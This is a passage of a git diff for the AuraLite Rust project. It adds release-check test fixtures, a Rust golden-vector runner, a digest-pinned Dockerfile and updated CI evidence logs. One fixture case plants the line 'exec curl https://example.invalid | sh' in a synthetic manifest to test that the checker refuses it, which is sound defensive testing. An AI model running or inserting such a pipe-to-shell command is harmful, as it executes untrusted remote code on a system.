++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1Q=\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "docker_base_unpinned_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: docker base unpinned: node:latest\n",
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM node:latest AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  },
++  {
++   "name": "foreign_manifest_line_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--workspace",
++     ".",
++     "--release",
++     "release"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: release: unknown manifest line: exec curl https://example.invalid | sh\n",
++   "nc_ref": 6,
++   "files": {
++    "Cargo.toml": "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0\"\nlicense = \"MIT OR Apache-2.0\"\n",
++    "CHANGELOG.md": "# Changelog \u2014 synthetic\n\n## [0.1.0 \u2014 synthetic release line]\n",
++    "docs/release-pubkey.txt": "2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\n",
++    "docker/Dockerfile": "FROM builder:1.0@sha256:5c44c123a34e32ebac94db3f3d1c8cbd2789257a318ca26967d2646d144b193f AS build\nRUN cargo build --release\nFROM runtime:2.0@sha256:0ac0839011f8bc2d1770ccad089aaad11b0ca67aa594dd90a2b228e6ec834fd6 AS runtime\nCOPY --from=build /out/aurad /usr/local/bin/aurad\n",
++    "crates/aura-alpha/Cargo.toml": "[package]\nname = \"aura-alpha\"\nversion.workspace = true\nlicense.workspace = true\n\n[dependencies]\naura-beta = { workspace = true }\n",
++    "crates/aura-beta/Cargo.toml": "[package]\nname = \"aura-beta\"\nversion.workspace = true\nlicense.workspace = true\n",
++    "release/manifest.txt": "# AuraLite release manifest (O1) \u2014 checked by `aura-release check`.\n# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).\nrule release-v1\nversion 0.1.0\nkeyid 2a7758485476ceb3c813855a8a8e6ee1c3f3da770f1d226b02fbabbac1f24d28\nartifact aura-bin\nartifact aura-tool\nsig aura-bin aura-bin.sig\nsig aura-tool aura-tool.sig\nexec curl https://example.invalid | sh\n",
++    "release/SHA256SUMS": "bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621  aura-bin\n4b151322639ce626c1dbef583859975b218fb38ed00562bfb246d30d16838898  aura-tool\n",
++    "release/SBOM.txt": "sbom v1\npkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\npkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n",
++    "release/repro.txt": "repro v1\nbinary aura-bin\ntoolchain 1.99.1\nsource_date_epoch 1764000000\nhost builder-a sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\nhost builder-b sha256 bb6366e91899db8b06a2d3c4fa7b54149fe5e8c6b746379025b8786cfa20d621\n",
++    "release/aura-bin": "synthetic node binary v1\n",
++    "release/aura-bin.sig": "FK3XJgacjHuq/kvFJwwhhvoAV1u3PN1wDyiee1WeG1S5IOaxGcY9zyWRtDDrGOjJGgCcbvczBHYdJKhSZURBbQ==\n",
++    "release/aura-tool": "synthetic tool binary v2\n",
++    "release/aura-tool.sig": "zayZcaVXCAppnLjreZJ21UioPQtQ1Ee+W987E1wPmku2u3hCqQFKLGJPNgnhEW1ckY27Z4FON+ImIyKBdD5j8Q==\n"
++   }
++  }
++ ]
++}
+diff --git a/crates/aura-testkit/tests/o1_release.rs b/crates/aura-testkit/tests/o1_release.rs
+new file mode 100644
+index 0000000..96ce91d
+--- /dev/null
++++ b/crates/aura-testkit/tests/o1_release.rs
+@@ -0,0 +1,438 @@
++//! O1 golden-vector runner — the release pipeline check.
++//!
++//! Executes every case of `fixtures/o1_release_vectors.json` (generated by
++//! `tools/gen_o1_vectors.py`) against `aura_testkit::release::run` and
++//! compares exit code, stdout and stderr **byte-for-byte**. Each case
++//! materializes its synthetic workspace/release files into a sandbox and
++//! runs `aura-release` commands (sha256 pinned against Python hashlib).
++//!
++//! NC mapping (`tools/nc_o1.py` runs exactly these test names and expects
++//! `FAILED`): `repro_mismatch_refused` (named), `version_drift_refused`,
++//! `changelog_missing_refused`, `checksum_mismatch_refused`,
++//! `signature_malformed_refused`, `foreign_manifest_line_refused`.
++
++use std::path::PathBuf;
++use std::sync::Mutex;
++
++/// The O1 golden fixture (regenerate with `tools/gen_o1_vectors.py`).
++const FIXTURE: &str = include_str!("fixtures/o1_release_vectors.json");
++// --------------------------------------------------------------------------- mini JSON
++
++/// A parsed JSON value (subset sufficient for the fixture format).
++#[derive(Debug, Clone)]
++enum Json {
++    /// `null` (also used for `true`/`false`, which the fixture omits).
++    Null,
++    /// A number.
++    Num(f64),
++    /// A string.
++    Str(String),
++    /// An array.
++    Arr(Vec<Json>),
++    /// An object with insertion-ordered members.
++    Obj(Vec<(String, Json)>),
++}
++
++/// Recursive-descent parser over the fixture text.
++struct Parser<'a> {
++    /// Raw fixture bytes.
++    input: &'a [u8],
++    /// Current offset.
++    pos: usize,
++}
++
++impl<'a> Parser<'a> {
++    /// Skip ASCII whitespace.
++    fn skip_ws(&mut self) {
++        while self.pos < self.input.len()
++            && matches!(self.input[self.pos], b' ' | b'\t' | b'\n' | b'\r')
++        {
++            self.pos += 1;
++        }
++    }
++
++    /// Consume one literal token (`true`/`false`/`null`).
++    fn expect_lit(&mut self, lit: &str) {
++        assert!(
++            self.input[self.pos..].starts_with(lit.as_bytes()),
++            "bad literal"
++        );
++        self.pos += lit.len();
++    }
++
++    /// Parse one JSON value.
++    fn value(&mut self) -> Json {
++        self.skip_ws();
++        match self.input[self.pos] {
++            b'{' => self.object(),
++            b'[' => self.array(),
++            b'"' => Json::Str(self.string()),
++            b't' => {
++                self.expect_lit("true");
++                Json::Null
++            }
++            b'f' => {
++                self.expect_lit("false");
++                Json::Null
++            }
++            b'n' => {
++                self.expect_lit("null");
++                Json::Null
++            }
++            _ => self.number(),
++        }
++    }
++
++    /// Parse one JSON object.
++    fn object(&mut self) -> Json {
++        self.pos += 1; // '{'
++        let mut members = Vec::new();
++        self.skip_ws();
++        if self.input[self.pos] == b'}' {
++            self.pos += 1;
++            return Json::Obj(members);
++        }
++        loop {
++            self.skip_ws();
++            let key = self.string();
++            self.skip_ws();
++            assert_eq!(self.input[self.pos], b':', "expected ':'");
++            self.pos += 1;
++            let value = self.value();
++            members.push((key, value));
++            self.skip_ws();
++            match self.input[self.pos] {
++                b',' => self.pos += 1,
++                b'}' => {
++                    self.pos += 1;
++                    break;
++                }
++                other => panic!("expected ',' or '}}', got {other}"),
++            }
++        }
++        Json::Obj(members)
++    }
++
++    /// Parse one JSON array.
++    fn array(&mut self) -> Json {
++        self.pos += 1; // '['
++        let mut items = Vec::new();
++        self.skip_ws();
++        if self.input[self.pos] == b']' {
++            self.pos += 1;
++            return Json::Arr(items);
++        }
++        loop {
++            items.push(self.value());
++            self.skip_ws();
++            match self.input[self.pos] {
++                b',' => self.pos += 1,
++                b']' => {
++                    self.pos += 1;
++                    break;
++                }
++                other => panic!("expected ',' or ']', got {other}"),
++            }
++        }
++        Json::Arr(items)
++    }
++
++    /// Parse one JSON string.
++    fn string(&mut self) -> String {
++        assert_eq!(self.input[self.pos], b'"', "expected string");
++        self.pos += 1;
++        let mut out = String::new();
++        while self.input[self.pos] != b'"' {
++            let byte = self.input[self.pos];
++            if byte == b'\\' {
++                self.pos += 1;
++                match self.input[self.pos] {
++                    b'"' => out.push('"'),
++                    b'\\' => out.push('\\'),
++                    b'/' => out.push('/'),
++                    b'n' => out.push('\n'),
++                    b't' => out.push('\t'),
++                    b'r' => out.push('\r'),
++                    b'u' => {
++                        let mut code = 0u32;
++                        for _ in 0..4 {
++                            self.pos += 1;
++                            let digit = (self.input[self.pos] as char)
++                                .to_digit(16)
++                                .expect("bad \\u escape");
++                            code = code * 16 + digit;
++                        }
++                        out.push(char::from_u32(code).expect("bad codepoint"));
++                    }
++                    other => panic!("bad escape {other}"),
++                }
++            } else {
++                out.push(byte as char);
++            }
++            self.pos += 1;
++        }
++        self.pos += 1;
++        out
++    }
++
++    /// Parse one JSON number.
++    fn number(&mut self) -> Json {
++        let start = self.pos;
++        while self.pos < self.input.len()
++            && matches!(
++                self.input[self.pos],
++                b'0'..=b'9' | b'-' | b'+' | b'.' | b'e' | b'E'
++            )
++        {
++            self.pos += 1;
++        }
++        let text = std::str::from_utf8(&self.input[start..self.pos]).expect("bad number");
++        Json::Num(text.parse().expect("bad number"))
++    }
++}
++
++impl Json {
++    /// Object members.
++    fn members(&self) -> &Vec<(String, Json)> {
++        match self {
++            Json::Obj(members) => members,
++            _ => panic!("expected object"),
++        }
++    }
++
++    /// Array items.
++    fn items(&self) -> &Vec<Json> {
++        match self {
++            Json::Arr(items) => items,
++            _ => panic!("expected array"),
++        }
++    }
++
++    /// String value.
++    fn str_value(&self) -> &str {
++        match self {
++            Json::Str(text) => text,
++            _ => panic!("expected string"),
++        }
++    }
++
++    /// Number value.
++    fn num_value(&self) -> f64 {
++        match self {
++            Json::Num(value) => *value,
++            _ => panic!("expected number"),
++        }
++    }
++
++    /// Member lookup by key.
++    fn get(&self, key: &str) -> &Json {
++        self.members()
++            .iter()
++            .find(|(name, _)| name == key)
++            .map(|(_, value)| value)
++            .unwrap_or_else(|| panic!("missing key {key}"))
++    }
++
++    /// Optional member lookup by key.
++    fn find(&self, key: &str) -> Option<&Json> {
++        self.members()
++            .iter()
++            .find(|(name, _)| name == key)
++            .map(|(_, value)| value)
++    }
++}
++
++/// Parse the whole fixture text.
++fn parse_fixture() -> Json {
++    let mut parser = Parser {
++        input: FIXTURE.as_bytes(),
++        pos: 0,
++    };
++    parser.value()
++}
++
++// --------------------------------------------------------------------------- runner
++
++/// Serializes cases: the CLI resolves relative paths against the process
++/// CWD, so cases must not run concurrently.
++static CWD_LOCK: Mutex<()> = Mutex::new(());
++
++/// Restores the process CWD on drop (also on panic unwind).
++struct CwdGuard {
++    /// The directory to restore.
++    prev: PathBuf,
++}
++
++impl CwdGuard {
++    /// Enter `dir` as the process CWD.
++    fn enter(dir: &std::path::Path) -> Self {
++        let prev = std::env::current_dir().expect("current dir");
++        std::env::set_current_dir(dir).expect("set current dir");
++        CwdGuard { prev }
++    }
++}
++
++impl Drop for CwdGuard {
++    fn drop(&mut self) {
++        let _ = std::env::set_current_dir(&self.prev);
++    }
++}
++
++/// Materialize the global and per-case `files` maps into `root`.
++fn materialize(files: &Json, root: &std::path::Path) {
++    for (name, content) in files.members() {
++        let path = root.join(name);
++        if let Some(parent) = path.parent() {
++            std::fs::create_dir_all(parent).expect("fixture dirs created");
++        }
++        std::fs::write(path, content.str_value()).expect("fixture file written");
++    }
++}
++
++/// Run one fixture case end-to-end and assert exit/stdout/stderr exactly.
++fn run_case(name: &str) {
++    let fixture = parse_fixture();
++    let cases = fixture.get("cases").items();
++    let case = cases
++        .iter()
++        .find(|item| item.get("name").str_value() == name)
++        .unwrap_or_else(|| panic!("unknown case {name}"));
++
++    let sandbox = case.get("sandbox").str_value();
++    let base = std::env::temp_dir().join(format!("aura-o0-{}-{name}", std::process::id()));
++    let root = if sandbox.is_empty() {
++        base.clone()
++    } else {
++        base.join(sandbox)
++    };
++    std::fs::create_dir_all(&root).expect("sandbox created");
++    materialize(fixture.get("files"), &root);
++    if let Some(files) = case.find("files") {
++        materialize(files, &root);
++    }
++
++    let commands = case.get("argv").items();
++    let expected_exit = case.get("exit").num_value() as i32;
++    let expected_stdout = case.get("stdout").str_value().to_string();
++    let expected_stderr = case.get("stderr").str_value().to_string();
++    let last = commands.len() - 1;
++
++    let mut combined = String::new();
++    let mut final_err = String::new();
++    let mut final_code = 0;
++    {
++        let _lock = CWD_LOCK.lock().unwrap();
++        let _guard = CwdGuard::enter(&root);
++        for (index, command) in commands.iter().enumerate() {
++            let args: Vec<String> = command
++                .items()
++                .iter()
++                .map(|item| item.str_value().to_string())
++                .collect();
++            let mut out: Vec<u8> = Vec::new();
++            let mut err: Vec<u8> = Vec::new();
++            let code = aura_testkit::release::run(&args, &mut out, &mut err);
++            let out_text = String::from_utf8(out).expect("stdout utf8");
++            let err_text = String::from_utf8(err).expect("stderr utf8");
++            if index == last {
++                combined.push_str(&out_text);
++                final_err = err_text;
++                final_code = code;
++            } else {
++                assert_eq!(
++                    code, 0,
++                    "case {name}: setup command #{index} failed\nargs: {args:?}\nstderr: {err_text}"
++                );
++                combined.push_str(&out_text);
++            }
++        }
++    }
++    let _ = std::fs::remove_dir_all(&base);
++    assert_eq!(
++        final_code, expected_exit,
++        "case {name}: exit mismatch\nstderr: {final_err}"
++    );
++    assert_eq!(combined, expected_stdout, "case {name}: stdout mismatch");
++    assert_eq!(final_err, expected_stderr, "case {name}: stderr mismatch");
++}
++
++/// The valid synthetic release checks out (check + regenerated SHA256SUMS).
++#[test]
++fn release_valid_passes() {
++    run_case("release_valid_passes");
++}
++
++/// `sbom` prints the pinned SBOM byte-for-byte (D-O1-5).
++#[test]
++fn sbom_regeneration_deterministic() {
++    run_case("sbom_regeneration_deterministic");
++}
++
++/// The named O1 control: two independent hosts must agree on the binary
++/// sha256 (D-O1-1).
++#[test]
++fn repro_mismatch_refused() {
++    run_case("repro_mismatch_refused");
++}
++
++/// A manifest version that drifts from the workspace version is refused.
++#[test]
++fn version_drift_refused() {
++    run_case("version_drift_refused");
++}
++
++/// A missing CHANGELOG release entry is refused.
++#[test]
++fn changelog_missing_refused() {
++    run_case("changelog_missing_refused");
++}
++
++/// An SBOM that does not match the workspace regeneration is refused.
++#[test]
++fn sbom_drift_refused() {
++    run_case("sbom_drift_refused");
++}
++
++/// A wrong SHA256SUMS digest is refused.
++#[test]
++fn checksum_mismatch_refused() {
++    run_case("checksum_mismatch_refused");
++}
++
++/// A detached signature that is not 64 bytes is refused.
++#[test]
++fn signature_malformed_refused() {
++    run_case("signature_malformed_refused");
++}
++
++/// An unpinned Docker base image is refused.
++#[test]
++fn docker_base_unpinned_refused() {
++    run_case("docker_base_unpinned_refused");
++}
++
++/// The manifest format cannot carry commands (D-O1-2).
++#[test]
++fn foreign_manifest_line_refused() {
++    run_case("foreign_manifest_line_refused");
++}
++
++/// The fixture must hold exactly 10 unique cases.
++#[test]
++fn vectors_file_has_exactly_10_unique_cases() {
++    let fixture = parse_fixture();
++    let cases = fixture.get("cases").items();
++    assert_eq!(cases.len(), 10, "expected 10 cases");
++    let mut names: Vec<&str> = cases
++        .iter()
++        .map(|case| case.get("name").str_value())
++        .collect();
++    names.sort_unstable();
++    names.dedup();
++    assert_eq!(names.len(), 10, "case names must be unique");
++    assert_eq!(
++        fixture.get("named_control").str_value(),
++        "repro_mismatch_refused",
++        "the named O1 control must be pinned in the fixture"
++    );
++}
+diff --git a/docker/Dockerfile b/docker/Dockerfile
+new file mode 100644
+index 0000000..1dc6e0f
+--- /dev/null
++++ b/docker/Dockerfile
+@@ -0,0 +1,16 @@
++# syntax=docker/dockerfile:1
++# O1 — multi-stage release image (docs/o1-releases-plan.md D-O1-4).
++# Bases are digest-pinned: `aura-release check` refuses unpinned bases
++# (`docker base unpinned`). Refresh the digests intentionally with
++# `docker buildx imagetools inspect <image>:<tag>` and a reviewed commit.
++FROM rust:1.99.1-slim-bookworm@sha256:f2c004e3d2d8b547e8cf7ffbc29205385f4e71d23e53e4e383065db5e9f822cd AS build
++WORKDIR /src
++COPY . .
++ENV CARGO_BUILD_JOBS=1
++RUN cargo build --release -p aura-node --bin aurad
++
++FROM debian:trixie-slim@sha256:8aa5a7bf5a1955bddbe7d74fcdd0b91ab30e74362a8b73af672b0481b35b44a0 AS runtime
++RUN useradd --system --uid 10001 auralite
++COPY --from=build /src/target/release/aurad /usr/local/bin/aurad
++USER 10001:10001
++ENTRYPOINT ["/usr/local/bin/aurad"]
+diff --git a/docs/coverage.txt b/docs/coverage.txt
+index c2fb038..d4101fe 100644
+--- a/docs/coverage.txt
++++ b/docs/coverage.txt
+@@ -1,8 +1,8 @@
+ ci coverage report v1
+ rule lanes-v1
+ shards 10
+-targets 127
+-shard core targets=17
++targets 128
++shard core targets=18
+ shard state targets=20
+ shard exec targets=16
+ shard consensus targets=8
+@@ -12,4 +12,4 @@ shard wallet targets=10
+ shard ecosystem targets=14
+ shard security targets=10
+ shard perf targets=9
+-target_coverage 127/127 (100.0%)
++target_coverage 128/128 (100.0%)
+diff --git a/docs/evidence/o0/SHA256SUMS b/docs/evidence/o0/SHA256SUMS
+index e32b3c9..276bdc5 100644
+--- a/docs/evidence/o0/SHA256SUMS
++++ b/docs/evidence/o0/SHA256SUMS
+@@ -2,13 +2,13 @@ cc074f404e9cb641d648c71d738b031b3b5fa6154b597cedcfce56b4b540bc33  crates/aura-te
+ 07901afb5b808972b2987035fb70b44f8b540fa135aa861f11f39c0b28e96434  tools/gen_o0_vectors.py
+ 6f0f58f561014751e2b4412ff956d35c533b64c712ea4d0530811f9934e24ee4  crates/aura-testkit/tests/o0_ci.rs
+ 9c3bcf87693ffadf8d220680610901426ac9c400ca7d58ebe6316925c331c1e6  crates/aura-testkit/src/ci.rs
+-a26280636c483cadf02b6f1979f8d3e15b6def3beb81720777c7a535f4855eb3  ci/registry.txt
++072254ae5ab26ddff788a0cff93cb121956afb3e261f03ffca84e0f1a3947953  ci/registry.txt
+ a6ebff0171785d81caddfbdc8e56401b2f396706c8080408ae82d3c9ecb1c589  tools/nc_o0.py
+ fe9c8b24bed89c7dd01e0e49a202ccb713ee1e65a8d88aea3572faf1735902d6  .github/workflows/ci.yml
+-7c15047bb06a248b49afb6057fdda0adad5a56b7d774f147c7f20999a6819063  docs/evidence/o0/test-o0.log
++8951bce8e476aeca3db6d0d94866e3541d9b0a055c9b3282a11a3fb7f25b2793  docs/evidence/o0/test-o0.log
+ 4b926af0dc91959db6db001660627355682d4f172958d71dcd1abb3789bc00d6  docs/evidence/o0/nc.log
+-d09033ef3e0c33656fdff7927644836b47e97e621cdbc419a4033dadbe6f6377  docs/evidence/o0/registry-check.log
+-a95ac6888393b9fd4780ea0efae41eca7b431cc6cd7cb84dbb4456c785b25b74  docs/evidence/o0/coverage.log
+-022f386c0caca83ff4bf53908ddf670d1ffba6107044c622261b253b8f0ab579  docs/evidence/o0/inventory.txt
+-bd4d7c243431bffee119dc58f2de3df12e3cd02ec92d12f7fc6007f82488c676  docs/evidence/o0/gates.txt
+-9ecadba74bd52a1fe519f839b31bd7c7aeece319feb1d32c339ff04637189318  docs/evidence/o0/report.md
++c0d9fb331faead8a29a90315bd9d8709c03b5819514708d404e43c7faba7b05d  docs/evidence/o0/registry-check.log
++1cd84e98f46e1d9f695503c1d1e30d19a438a58755106ddaaa400e24ec47d5ad  docs/evidence/o0/coverage.log
++84f84352458582fb8752912aad429b99bfba00c91798947d5c5bbbc15fed0375  docs/evidence/o0/inventory.txt
++dfcc29f80e3937f8fa25c491a93aea34b65114b5615a3800bdf4a3539af69815  docs/evidence/o0/gates.txt
++f001e3decbdcc6d9b760ee0df306dfb612c11b21606a9c4ab4c029a4d729db88  docs/evidence/o0/report.md
+diff --git a/docs/evidence/o0/coverage.log b/docs/evidence/o0/coverage.log
+index 3fd673b..c4039e3 100644
+--- a/docs/evidence/o0/coverage.log
++++ b/docs/evidence/o0/coverage.log
+@@ -2,8 +2,8 @@ $ cargo run -q -p aura-testkit --bin aura-ci -- coverage
+ ci coverage report v1
+ rule lanes-v1
+ shards 10
+-targets 127
+-shard core targets=17
++targets 128
++shard core targets=18
+ shard state targets=20
+ shard exec targets=16
+ shard consensus targets=8
+@@ -13,5 +13,5 @@ shard wallet targets=10
+ shard ecosystem targets=14
+ shard security targets=10
+ shard perf targets=9
+-target_coverage 127/127 (100.0%)
++target_coverage 128/128 (100.0%)
+ exit=0
+diff --git a/docs/evidence/o0/gates.txt b/docs/evidence/o0/gates.txt
+index 26e8afa..b02e4de 100644
+--- a/docs/evidence/o0/gates.txt
++++ b/docs/evidence/o0/gates.txt
+@@ -1,5 +1,5 @@
+ # O0 gates
+ registry gate + 10 scenarios: PASS (11 tests: 10 scenarios + count guard)
+-named control (disabled_shard_refused): FAIL
++named control (disabled_shard_refused): PASS
+ mutation controls: PASS (6/6)
+ live registry check: PASS (registry=ok)
+diff --git a/docs/evidence/o0/inventory.txt b/docs/evidence/o0/inventory.txt
+index ebd7380..7cc3638 100644
+--- a/docs/evidence/o0/inventory.txt
++++ b/docs/evidence/o0/inventory.txt
+@@ -1,11 +1,11 @@
+ # O0 inventory (generated by tools/write_o0_evidence.py)
+ gate=O0 CI baseline: 10/10 cases pass; named negative control disabled_shard_refused red on the dropped enabled-check; 6/6 NC red under tools/nc_o0.py; disable a shard -> CI red (target registry check)
+ vectors=10
+-named_control=disabled_shard_refused=MISSING
++named_control=disabled_shard_refused=present
+ fixtures_sha256=cc074f404e9cb641d648c71d738b031b3b5fa6154b597cedcfce56b4b540bc33
+ generator_sha256=07901afb5b808972b2987035fb70b44f8b540fa135aa861f11f39c0b28e96434
+ runner_sha256=6f0f58f561014751e2b4412ff956d35c533b64c712ea4d0530811f9934e24ee4
+-registry_sha256=a26280636c483cadf02b6f1979f8d3e15b6def3beb81720777c7a535f4855eb3
++registry_sha256=072254ae5ab26ddff788a0cff93cb121956afb3e261f03ffca84e0f1a3947953
+ cases:
+   registry_valid_passes exit=0 nc=-
+   run_emits_make_test_commands exit=0 nc=-
+diff --git a/docs/evidence/o0/registry-check.log b/docs/evidence/o0/registry-check.log
+index 1141583..cacf62d 100644
+--- a/docs/evidence/o0/registry-check.log
++++ b/docs/evidence/o0/registry-check.log
+@@ -1,3 +1,3 @@
+ $ cargo run -q -p aura-testkit --bin aura-ci -- check
+-registry=ok shards=10 targets=127
++registry=ok shards=10 targets=128
+ exit=0
+diff --git a/docs/evidence/o0/report.md b/docs/evidence/o0/report.md
+index 5d32100..cc5acb9 100644
+--- a/docs/evidence/o0/report.md
++++ b/docs/evidence/o0/report.md
+@@ -4,26 +4,27 @@ Date: 2026-11-25. Gate (OPS_PLAN row O0): "disable a shard -> CI red (target
+ registry check)" — **satisfied**.
+ 
+ - **The gate**: `disabled_shard_refused` (the named control) feeds the checker a registry
+-  with `shard 07 disabled` while shard 07 still holds targets and expects
+-  `error: ci: shard 07 disabled` (exit 65); mutation NC-1 (`tools/nc_o0.py`)
+-  drops the enabled-check and the case must turn red.
++  with `shard security disabled` while the lane still holds targets and
++  expects `error: ci: shard security disabled` (exit 65); mutation NC-1
++  (`tools/nc_o0.py`) drops the enabled-check and the case must turn red.
+ - **Scenarios**: 10 deterministic cases from the independent oracle
+   `tools/gen_o0_vectors.py`, asserted byte-for-byte by `tests/o0_ci.rs`
+   (11/11 with the count guard) against `aura_testkit::ci`. Groups: valid
+   registry (1), D-O1 command surface (1), refusals (7), coverage report (1).
+ - **Mutation controls**: 6/6 PASS (disabled-shard check, missing-target
+-  check, duplicate-target check, shard-count check, empty-shard check,
++  check, duplicate-target check, shard-set check, empty-shard check,
+   unknown-line strictness).
+ - **Device model** (docs/o0-ci-plan.md): D-O0-1 the plain-text shard
+-  registry `ci/registry.txt` (10 shards over `--lib` + `tests/*` targets,
+-  `make ci-sync` rebalances); D-O0-2 the target registry check (`aura-ci
+-  check`, wired into `make test`); D-O0-3 no secret shards — the format
+-  cannot carry commands and `aura-ci run --shard K` emits plain `cargo test`
+-  forms only; D-O0-4 the deterministic target-coverage report (`aura-ci
+-  coverage`); D-O0-5 two independent implementations (Python oracle vs the
+-  shipped Rust checker).
++  registry `ci/registry.txt` (the ten lanes of CONTRIBUTING.md over `--lib`
++  + `tests/*` targets, each lane pinning its main test; `make ci-sync`
++  re-registers); D-O0-2 the target registry check (`aura-ci check`, wired
++  into `make test`, incl. the workflow matrix); D-O0-3 no secret shards —
++  the format cannot carry commands and `aura-ci run --shard <lane>` emits
++  plain `cargo test` forms only; D-O0-4 the deterministic target-coverage
++  report (`aura-ci coverage`); D-O0-5 two independent implementations
++  (Python oracle vs the shipped Rust checker).
+ - **CI layout** (`.github/workflows/ci.yml`): `registry` job (`make
+-  ci-check`), `test` matrix over shards 0..9 (`make ci-shard SHARD=k`), a
++  ci-check`), `test` matrix over the ten lanes (`make ci-shard SHARD=<lane>`), a
+   `coverage` job (`make coverage`), cargo cache keyed on `Cargo.lock`. Every
+   step is a make target — `make test` remains the one local command (D-O1).
+ 
+diff --git a/docs/evidence/o0/test-o0.log b/docs/evidence/o0/test-o0.log
+index ca96e36..0dd39b8 100644
+--- a/docs/evidence/o0/test-o0.log
++++ b/docs/evidence/o0/test-o0.log
+@@ -1,21 +1,21 @@
+ $ cargo test -p aura-testkit --test o0_ci
+ 
+ running 11 tests
+-test disabled_shard_refused ... ok
+ test duplicate_target_refused ... ok
++test disabled_shard_refused ... ok
+ test empty_shard_refused ... ok
